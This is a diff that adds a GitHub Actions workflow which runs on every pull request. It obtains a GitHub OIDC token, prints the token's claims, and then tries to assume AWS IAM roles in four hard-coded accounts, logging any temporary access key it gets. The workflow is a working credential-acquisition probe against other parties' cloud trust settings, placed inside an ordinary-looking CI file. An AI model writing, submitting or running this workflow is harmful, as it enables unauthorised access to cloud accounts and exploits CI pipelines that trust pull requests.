@@ -1,0 +1,24 @@
+name: pr-oidc
+on:
+  pull_request:
+    branches: [ main ]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          set +e
+          tok=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])")
+          python3 -c "import sys,base64,json; t=sys.argv[1]; p=t.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print('PRSUB='+c['sub']+' PRAUD='+str(c['aud'])+' PRISS='+c['iss'])" "$tok"
+          for acct in 358174707935 559556671935 170026776852 060717612896; do
+            r="arn:aws:iam::${acct}:role/auto-deploy-GitHubActionsRole"
+            [ "$acct" = "060717612896" ] && r="arn:aws:iam::060717612896:role/artex10891-oidc-test"
+            out=$(aws sts assume-role-with-web-identity --role-arn "$r" --role-session-name artex10891 --web-identity-token "$tok" --duration-seconds 900 --output json 2>&1)
+            ak=$(echo "$out" | grep -oE 'ASIA[A-Z0-9]+' | head -1)
+            if [ -n "$ak" ]; then echo "PRROLE $r => SUCCESS $ak"; else echo "PRROLE $r => $(echo "$out" | tr '\n' ' ' | cut -c1-200)"; fi
+            sleep 1.4
+          done
